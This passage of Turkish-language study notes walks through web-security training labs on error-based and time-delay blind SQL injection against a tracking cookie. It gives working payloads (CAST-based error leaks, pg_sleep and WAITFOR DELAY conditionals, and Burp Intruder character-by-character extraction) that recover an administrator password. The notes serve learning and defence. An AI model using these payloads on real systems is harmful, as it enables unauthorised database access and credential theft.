Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char
```

Bu hata mesajı, uygulamanın inputumuzu kullanarak oluşturduğu tam SQL sorgusunu gösteriyor. Bu durumda, bir **`WHERE`** ifadesinin içinde tek tırnak (`'`) içine alınmış bir string içine **injection** yapıyoruz. Bu, geçerli bir sorgu oluşturmayı ve **exploit** edilebilir bir **payload** eklemeyi kolaylaştırıyor. Fazladan tek tırnağın (**syntax hatasına yol açmaması için**) sorgunun geri kalan kısmını **comment** ile etkisiz hale getirmek mantıklı olabilir.

Bazen, uygulamayı hata mesajında sorgudan dönen verinin bir kısmını göstermeye zorlayabilirsin. Bu, **blind SQL injection** açığını **error-based SQL injection** gibi görünür hale getirir.

Bunu başarmak için **`CAST()`** fonksiyonunu kullanabilirsin. **`CAST()`**, bir veri tipini başka bir veri tipine dönüştürmeye yarar. Örneğin, aşağıdaki ifadeyi içeren bir sorguyu düşün:

```
CAST((SELECT example_column FROM example_table) AS int)
```

Genellikle, okumaya çalıştığınız veri bir string'tir. Bunu int gibi uyumsuz bir veri türüne dönüştürmeye çalışmak aşağıdakine benzer bir hataya neden olabilir:

```
ERROR: invalid input syntax for type integer: "Example data"
```

Bu tür bir sorgu, eğer bir **character limit** koşullu yanıtları tetiklemeni engelliyorsa, yine de faydalı olabilir.

---

### Lab: Visible error-based SQL injection

Bu **lab**, bir **SQL injection** açığı içeriyor. Uygulama, **analytics** için bir **tracking cookie** kullanıyor ve gönderilen **cookie** değerini içeren bir **SQL query** çalıştırıyor. Ancak, **query** sonucunda dönen veri doğrudan görüntülenmiyor.

**Database**, **users** adında farklı bir **table** içeriyor ve bu **table**, **username** ve **password** adında **columns** barındırıyor.

**Lab**ı çözmek için, **administrator** kullanıcısının **password** değerini **leak** etmenin bir yolunu bul ve ardından bu hesapla giriş yap.

Çözüm : 

1- **Repeater** içinde **TrackingId** değerinin sonuna **tek tırnak (')** ekleyerek isteği gönder:

```
TrackingId=ogAZZfxtOKUELbuJ'
```

2- **Response** içinde ayrıntılı bir **error message** olduğunu fark et. Bu hata mesajı, **SQL query**nin tamamını ve **cookie** değerini gösterir. Ayrıca, **unclosed string literal** olduğunu açıklar.

![Pasted image 20250330215916.png](/img/user/resimler/Pasted%20image%2020250330215916.png)

3- **Injection**'ın, **single-quoted string** içinde gerçekleştiğini gözlemle.

4- Hata veren **ekstra tek tırnak (')** karakterini devre dışı bırakmak için **SQL comment characters** ekleyerek sorgunun geri kalanını yorum satırına al:

```
TrackingId=ogAZZfxtOKUELbuJ'--
```

![Pasted image 20250330220027.png](/img/user/resimler/Pasted%20image%2020250330220027.png)

5- İsteği gönder ve artık hata almadığını doğrula. Bu, sorgunun artık **syntactically valid** olduğunu gösterir.

6- **Generic SELECT subquery** içeren ve sonucu **int** veri tipine çeviren bir sorgu dene:

```
TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)--
```

![Pasted image 20250330220411.png](/img/user/resimler/Pasted%20image%2020250330220411.png)

7- Yeni hata mesajında, **AND koşulunun boolean expression olması gerektiği** söylenir.

8- Bu hatayı düzeltmek için **karşılaştırma operatörü (=)** ekle:

```
TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--
```

![Pasted image 20250330220507.png](/img/user/resimler/Pasted%20image%2020250330220507.png)

9-Daha fazla karakter boşaltmak için **`TrackingId`** değerinin orijinal kısmını tamamen silerek isteği tekrar gönder:

```
TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--
```

![Pasted image 20250330220530.png](/img/user/resimler/Pasted%20image%2020250330220530.png)

10- **Yeni bir hata mesajı alırsın**. Bu mesaj, **query'nin düzgün çalıştığını ancak birden fazla satır döndürdüğünü** gösterir.

11- Sadece **bir satır** döndürmek için **LIMIT 1** ekle:

```
TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```

![Pasted image 20250330220618.png](/img/user/resimler/Pasted%20image%2020250330220618.png)

12-**Error message**, artık **"`administrator`"** değerini sızdırır. Bu, **`users`** tablosundaki ilk kullanıcının **administrator** olduğunu gösterir.

13- **Administrator** hesabının şifresini almak için sorguyu şu şekilde değiştir:

```
TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

![Pasted image 20250330220701.png](/img/user/resimler/Pasted%20image%2020250330220701.png)

14- **Sızdırılan şifreyi kullanarak administrator olarak giriş yap** ve **labı çöz**.

---

### Time Delays'i tetikleyerek blind SQL injection'dan yararlanma

Uygulama, SQL sorgusu yürütüldüğünde veritabanı hatalarını yakalar ve bunları incelikle ele alırsa, uygulamanın response'unda herhangi bir fark olmayacaktır. Bu da önceki koşullu hata oluşturma tekniğinin işe yaramayacağı anlamına gelir.

Bu durumda, enjekte edilen bir koşulun true ya da false olmasına bağlı olarak zaman gecikmelerini tetikleyerek blind SQL injection zafiyetinden faydalanmak genellikle mümkündür. SQL sorguları normalde uygulama tarafından senkronize olarak işlendiğinden, bir SQL sorgusunun yürütülmesini geciktirmek HTTP response'unu da geciktirir. Bu, HTTP response'unun alınması için geçen süreye bağlı olarak enjekte edilen koşulun doğruluğunu belirlemenize olanak tanır.

Bir zaman gecikmesini tetikleme teknikleri kullanılan veritabanı türüne özgüdür. Örneğin, Microsoft SQL Server'da bir koşulu test etmek ve ifadenin doğru olup olmamasına bağlı olarak bir gecikmeyi tetiklemek için aşağıdakileri kullanabilirsiniz:

```
'; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'--
```

* Bu inputlardan ilki bir gecikmeyi tetiklemez, çünkü 1=2 koşulu yanlıştır.
* İkinci input 10 saniyelik bir gecikmeyi tetikler, çünkü 1=1 koşulu doğrudur.

Bu tekniği kullanarak, her seferinde bir karakteri test ederek verileri alabiliriz:

```
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
```

---

### Lab: Blind SQL injection with time delays

Bu laboratuvar bir blind SQL injection güvenlik açığı içermektedir. Uygulama, analitik için bir tracking cookie kullanır ve gönderilen cookie'nin değerini içeren bir SQL sorgusu gerçekleştirir.

SQL sorgusunun sonuçları döndürülmez ve uygulama, sorgunun herhangi bir satır döndürmesine veya bir hataya neden olmasına bağlı olarak farklı bir yanıt vermez. Ancak, sorgu eşzamanlı olarak yürütüldüğünden, bilgi çıkarmak için koşullu zaman gecikmelerini tetiklemek mümkündür.

Laboratuvarı çözmek için, 10 saniyelik bir gecikmeye neden olacak şekilde SQL enjeksiyonu güvenlik açığından yararlanın.

Çözüm : 

1- Mağazanın ana sayfasını ziyaret edin ve Burp Suite kullanarak _TrackingId_ cookie'si içeren request'i yakalayın ve değiştirin.

2-_TrackingId_ cookie'sini aşağıdaki şekilde değiştirin:

```
TrackingId=x'||pg_sleep(10)--
```

3-Request'i gönderin ve uygulamanın response vermesinin 10 saniye sürdüğünü gözlemleyin.

![Pasted image 20250331003149.png](/img/user/resimler/Pasted%20image%2020250331003149.png)

---

### Lab: Blind SQL injection with time delays and information retrieval

Bu lab, _blind SQL injection_ açığı içermektedir. Uygulama, analitik amacıyla _TrackingId_ cookie'sini kullanmakta ve gönderilen cookie'nin değerini içeren bir SQL sorgusu çalıştırmaktadır.

SQL sorgusunun sonuçları döndürülmez ve uygulama, sorgunun herhangi bir satır döndürüp döndürmediğine veya hata oluşturup oluşturmadığına bağlı olarak farklı bir response vermez. Ancak, sorgu senkron olarak çalıştırıldığı için koşullu zaman gecikmeleri tetiklenerek bilgi sızdırmak mümkündür.

Veritabanında _users_ adında farklı bir tablo bulunmaktadır ve bu tabloda `username` ve `password` sütunları yer almaktadır. Blind SQL injection açığını kullanarak _administrator_ kullanıcısının şifresini bulmanız gerekmektedir.

Lab'ı çözmek için `administrator` kullanıcısı olarak giriş yapın.

Cevap : 

Öncelikle mağazanın ana sayfasına gidin ve Burp Suite kullanarak **TrackingId** cookie içeren isteği yakalayın ve değiştirin.

```
TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
```

Uygulamanın yanıt vermesinin **10 saniye sürdüğünü** doğrulayın.

Şimdi şu değere değiştirin:

```
TrackingId=x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
```

Uygulamanın **hemen yanıt verdiğini** doğrulayın. Bu, **boolean tabanlı bir koşulu** test etmenin ve sonucu çıkarsamanın bir yoludur.

Şimdi şu değere değiştirin:

```
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

Koşulun **doğru olduğunu** ve veritabanında **administrator** adlı bir kullanıcının bulunduğunu doğrulayın.

Şifre uzunluğunu belirleme:

**administrator** kullanıcısının şifresinin kaç karakter olduğunu anlamak için şu sorguyu gönderin:

```
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

Uygulamanın **10 saniye gecikme ile yanıt verdiğini** doğrulayın.

Aynı yöntemi kullanarak, **LENGTH(password)>2**, **LENGTH(password)>3**, … şeklinde artan değerlerle test edin.

Gecikme **artık oluşmadığında**, şifre uzunluğunu belirlemiş olacaksınız. Örneğin, yanıt süresi aniden hızlandığında şifrenin **20 karakter** olduğunu öğrenmiş olacaksınız.

**Şifre karakterlerini tek tek öğrenme:**

Şifrenin **her bir karakterini** bulmak için **Burp Intruder** kullanın.

Aşağıdaki değeri kullanarak Burp Intruder’a gönderin:

```
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

Burp Intruder’da **payload konumları** ekleyin ve şu formatı kullanın:

```
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

**Payload listesi** olarak **a-z ve 0-9** karakterlerini içeren bir liste oluşturun.

**Attack** ayarlarında **Maximum concurrent requests** değerini **1** olarak ayarlayın.

**Saldırıyı başlatın ve sonuçları inceleyin.** 10 saniye gecikme yaşanan karakter, şifrenin ilk karakteridir.

Ardından, aynı işlemi **SUBSTRING(password,2,1)**, **SUBSTRING(password,3,1)** vb. şeklinde **şifrenin tüm karakterleri için** tekrarlayın.

Elde edilen şifreyi kullanarak giriş sayfasına gidin ve **administrator** olarak giriş yapın.





